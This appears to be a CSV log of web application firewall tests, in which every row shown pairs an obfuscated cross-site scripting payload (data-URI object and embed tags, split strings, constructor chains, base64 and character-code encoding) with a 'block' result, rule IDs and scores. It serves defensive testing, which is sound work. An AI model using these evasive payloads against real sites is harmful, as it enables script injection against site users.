1740,"<object data=""data:text/html,<script>(0,window['eva'+'l'])('ale'+'rt(5)')</script>"">",0,1,block,11,"932130,933210,941100,941110,941130,941140,941160,941170,941300,941370,949110","o35,29v217,84t:urlDecodeUni,t:cmdLine || o46,27v217,84t:urlDecode,t:replaceComments,t:compressWhitespace || v217,84t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o29,8v217,84t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,15v217,84t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,37v217,84t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,8v217,84t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,16v217,84t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,13v217,84t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o40,17v217,84t:urlDecodeUni,t:compressWhitespace || ",50,177826740985.399691
1744,"<object data=""data:text/html,<script>(new(window['Func'+'tion'])('ale'+'rt(5)')())</script>"">",0,1,block,11,"932130,933210,941100,941110,941130,941140,941160,941170,941300,941370,949110","o35,38v217,93t:urlDecodeUni,t:cmdLine || o37,45v217,93t:urlDecode,t:replaceComments,t:compressWhitespace || v217,93t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o29,8v217,93t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,15v217,93t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,37v217,93t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,8v217,93t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,16v217,93t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,13v217,93t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o42,21v217,93t:urlDecodeUni,t:compressWhitespace || ",50,177826741866.834598
1749,"<object data=""data:text/html,<script>window['setInter'+'val']('ale'+'rt(5)',1)</script>"">",0,1,block,10,"933210,941100,941110,941130,941140,941160,941170,941300,941370,949110","o43,35v217,89t:urlDecode,t:replaceComments,t:compressWhitespace || v217,89t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o29,8v217,89t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,15v217,89t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,37v217,89t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,8v217,89t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,16v217,89t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,13v217,89t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o37,24v217,89t:urlDecodeUni,t:compressWhitespace || ",45,17782674296.350863
1750,"<object data=""data:text/html,<script>self['cons'+'tructor']['cons'+'tructor']('ale'+'rt(5)')()</script>"">",0,1,block,10,"933210,941100,941110,941130,941140,941160,941170,941300,941370,949110","o41,53v217,105t:urlDecode,t:replaceComments,t:compressWhitespace || v217,105t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o29,8v217,105t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,15v217,105t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,37v217,105t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,8v217,105t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,16v217,105t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,13v217,105t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o37,22v217,105t:urlDecodeUni,t:compressWhitespace || ",45,177826743162.529345
1752,"<object data=""data:text/html,<script>(new(self.Function)(self.atob('YWxlcnQoMTIp')))()</script>"">",0,1,block,10,"932130,933210,941100,941110,941130,941140,941160,941170,941300,949110","o35,48v217,97t:urlDecodeUni,t:cmdLine || o37,49v217,97t:urlDecode,t:replaceComments,t:compressWhitespace || v217,97t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o29,8v217,97t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,15v217,97t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,37v217,97t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,8v217,97t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,16v217,97t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,13v217,97t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",45,177826743638.712206
1754,"<object data=""data:text/html,<script>(this['Function'](atob('YWxlcnQoMTIp')))()</script>"">",0,1,block,11,"932130,933210,941100,941110,941130,941140,941160,941170,941300,941370,949110","o35,39v217,90t:urlDecodeUni,t:cmdLine || o37,42v217,90t:urlDecode,t:replaceComments,t:compressWhitespace || v217,90t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o29,8v217,90t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,15v217,90t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,37v217,90t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,8v217,90t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,16v217,90t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,13v217,90t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o38,16v217,90t:urlDecodeUni,t:compressWhitespace || ",50,177826744069.246147
1759,"<object data=""data:text/html,<script>/**/new/**/Function/**/(atob('YWxlcnQoMTIp'))/**/()</script>"">",0,1,block,8,"941100,941110,941130,941140,941160,941170,941300,949110","v217,99t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o29,8v217,99t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,15v217,99t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,37v217,99t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,8v217,99t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,16v217,99t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,13v217,99t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",35,177826745138.325815
1762,"<object data=""data:text/html,<script>(function(){}.constructor)(atob('YWxlcnQoMTIp'))()</script>"">",0,1,block,12,"932100,932130,933210,934100,941100,941110,941130,941140,941160,941170,941300,949110","o36,10v217,98 || o35,49v217,98t:urlDecodeUni,t:cmdLine || o37,50v217,98t:urlDecode,t:replaceComments,t:compressWhitespace || o38,11v217,98 || v217,98t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o29,8v217,98t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,15v217,98t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,37v217,98t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,8v217,98t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,16v217,98t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,13v217,98t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",55,177826745880.349415
1763,"<embed src=""data:text/html,<script>(new Function(atob('YWxlcnQoMTIp')))()</script>"">",0,1,block,10,"932130,934100,941100,941110,941130,941140,941160,941170,941230,949110","o33,37v217,84t:urlDecodeUni,t:cmdLine || o36,13v217,84 || v217,84t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o27,8v217,84t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o11,15v217,84t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,35v217,84t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,11v217,84t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o11,16v217,84t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,11v217,84t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",45,177826746072.009917
1765,"<object data=""data:text/html,<script>Function(atob('YWxlcnQoMTIp'))()</script>"">",0,1,block,8,"941100,941110,941130,941140,941160,941170,941300,949110","v217,80t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o29,8v217,80t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,15v217,80t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,37v217,80t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,8v217,80t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,16v217,80t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,13v217,80t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",35,177826746598.631079
1766,"<object data=""data:text/html,<svg/onload=Function(atob('YWxlcnQoMTIp'))()>"">",0,1,block,8,"941100,941120,941130,941140,941160,941170,941300,949110","v217,76t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o33,8v217,76t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,15v217,76t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,74v217,76t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,41v217,76t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,16v217,76t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,13v217,76t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",35,177826746783.319110
1767,"<object data=""data:text/html,<script>[]['fill']['constructor']('return'+' '+'this')()['Function'](atob('YWxlcnQoMTIp'))()</script>"">",0,1,block,9,"933210,941100,941110,941130,941140,941160,941170,941300,949110","o37,84v217,132t:urlDecode,t:replaceComments,t:compressWhitespace || v217,132t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o29,8v217,132t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,15v217,132t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,37v217,132t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,8v217,132t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,16v217,132t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,13v217,132t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",40,177826746999.860901
1771,"<object data=""data:text/html,<script>''['constructor']['constructor'](atob('YWxlcnQoMTIp'))()</script>"">",0,1,block,9,"933210,941100,941110,941130,941140,941160,941170,941300,949110","o39,54v217,104t:urlDecode,t:replaceComments,t:compressWhitespace || v217,104t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o29,8v217,104t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,15v217,104t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,37v217,104t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,8v217,104t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,16v217,104t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,13v217,104t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",40,177826747817.200581
1774,"<object data=""data:text/html,<script>[]['constructor']['constructor']('ale'+'rt(1)')()</script>""></object>",0,1,block,9,"933210,941100,941110,941130,941140,941160,941170,941300,949110","o37,49v217,106t:urlDecode,t:replaceComments,t:compressWhitespace || v217,106t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o29,8v217,106t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,15v217,106t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,37v217,106t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,8v217,106t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,16v217,106t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,13v217,106t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",40,177826748419.075078
1775,"<object data=""data:text/html,<script>self['cons'+'tructor']['cons'+'tructor']('ale'+'rt(1)')()</script>""></object>",0,1,block,10,"933210,941100,941110,941130,941140,941160,941170,941300,941370,949110","o41,53v217,114t:urlDecode,t:replaceComments,t:compressWhitespace || v217,114t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o29,8v217,114t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,15v217,114t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,37v217,114t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,8v217,114t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,16v217,114t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,13v217,114t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o37,22v217,114t:urlDecodeUni,t:compressWhitespace || ",45,177826748765.122707
1777,"<object data=""data:text/html,<script>({})['const'+'ructor']['const'+'ructor']('ale'+'rt(1)')()</script>""></object>",0,1,block,10,"932130,933210,941100,941110,941130,941140,941160,941170,941300,949110","o35,46v217,114t:urlDecodeUni,t:cmdLine || o37,57v217,114t:urlDecode,t:replaceComments,t:compressWhitespace || v217,114t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o29,8v217,114t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,15v217,114t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,37v217,114t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,8v217,114t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,16v217,114t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,13v217,114t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",45,177826749121.012393
1779,"<object data=""data:text/html,<script>(true)['const'+'ructor']['const'+'ructor']('ale'+'rt(1)')()</script>""></object>",0,1,block,10,"932130,933210,941100,941110,941130,941140,941160,941170,941300,949110","o35,48v217,116t:urlDecodeUni,t:cmdLine || o37,59v217,116t:urlDecode,t:replaceComments,t:compressWhitespace || v217,116t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o29,8v217,116t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,15v217,116t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,37v217,116t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,8v217,116t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,16v217,116t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,13v217,116t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",45,177826749511.464317
1780,"<object data=""data:text/html,<script>window['Fun'+'ction']('ale'+'rt'+'(1)')()</script>""></object>",0,1,block,10,"933210,941100,941110,941130,941140,941160,941170,941300,941370,949110","o43,35v217,98t:urlDecode,t:replaceComments,t:compressWhitespace || v217,98t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o29,8v217,98t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,15v217,98t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,37v217,98t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,8v217,98t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,16v217,98t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,13v217,98t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o37,21v217,98t:urlDecodeUni,t:compressWhitespace || ",45,177826749766.578207
1783,"<object data=""data:text/html,<script>(0)['const'+'ructor']['const'+'ructor']('ale'+'rt(1)')()</script>""></object>",0,1,block,10,"932130,933210,941100,941110,941130,941140,941160,941170,941300,949110","o35,45v217,113t:urlDecodeUni,t:cmdLine || o37,56v217,113t:urlDecode,t:replaceComments,t:compressWhitespace || v217,113t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o29,8v217,113t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,15v217,113t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,37v217,113t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,8v217,113t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,16v217,113t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,13v217,113t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",45,177826750499.711279
1784,"<object data=""data:text/html,<script>''['const'+'ructor']['const'+'ructor']('ale'+'rt(1)')()</script>""></object>",0,1,block,9,"933210,941100,941110,941130,941140,941160,941170,941300,949110","o39,53v217,112t:urlDecode,t:replaceComments,t:compressWhitespace || v217,112t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o29,8v217,112t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,15v217,112t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,37v217,112t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,8v217,112t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,16v217,112t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,13v217,112t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",40,177826750621.304677
1787,"<object data=""data:text/html,<script>window[(1,Function)['name']](String.fromCharCode(97,108,101,114,116,40,49,41))()</script>""></object>",0,1,block,11,"933210,934100,941100,941110,941130,941140,941160,941170,941300,941370,949110","o56,61v217,137t:urlDecode,t:replaceComments,t:compressWhitespace || o66,19v217,137 || v217,137t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o29,8v217,137t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,15v217,137t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,37v217,137t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,8v217,137t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,16v217,137t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,13v217,137t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o37,27v217,137t:urlDecodeUni,t:compressWhitespace || ",50,177826751333.434565
1788,"<object data=""data:text/html,<script>this['con'+'structor']['con'+'structor']('ale'+'rt(1)')()</script>""></object>",0,1,block,10,"933210,941100,941110,941130,941140,941160,941170,941300,941370,949110","o41,53v217,114t:urlDecode,t:replaceComments,t:compressWhitespace || v217,114t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o29,8v217,114t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,15v217,114t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,37v217,114t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,8v217,114t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,16v217,114t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,13v217,114t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o37,22v217,114t:urlDecodeUni,t:compressWhitespace || ",45,177826751548.921727
1793,"<object data=""data:text/html,<script>this['constr'+'uctor']['constr'+'uctor']('al'+'ert(1)')()</script>""></object>",0,1,block,10,"933210,941100,941110,941130,941140,941160,941170,941300,941370,949110","o41,53v217,114t:urlDecode,t:replaceComments,t:compressWhitespace || v217,114t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o29,8v217,114t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,15v217,114t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,37v217,114t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,8v217,114t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,16v217,114t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,13v217,114t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o37,22v217,114t:urlDecodeUni,t:compressWhitespace || ",45,177826752663.759055
1816,"<object data=""data:text/html,<math><mtext><script>al&#x65;rt(1)</script></mtext></math>""></object>",0,1,block,8,"941100,941110,941130,941140,941160,941170,941300,949110","v217,98t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o42,8v217,98t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,15v217,98t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,35v217,98t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,8v217,98t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,16v217,98t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,13v217,98t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",35,177826757742.907634
